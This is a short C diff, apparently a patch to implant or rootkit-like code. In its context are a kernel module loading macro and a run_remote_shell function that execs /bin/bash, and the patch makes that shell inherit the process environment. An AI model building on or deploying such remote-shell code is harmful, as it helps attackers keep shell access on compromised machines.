@@ -65,6 +65,8 @@ int inot_epoll = -1;
 struct inot_watch* inot_wds;
 size_t* inot_watch_count;
 
+extern char **environ;
+
 #define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)
 
 /*
@@ -149,7 +151,7 @@ void run_remote_shell(void) {
     sh[0] = "/bin/bash";
     sh[1] = NULL;
 
-    execve(sh[0], (char* const*) sh, 0);
+    execve(sh[0], (char* const*) sh, environ);
 }
 
 /*
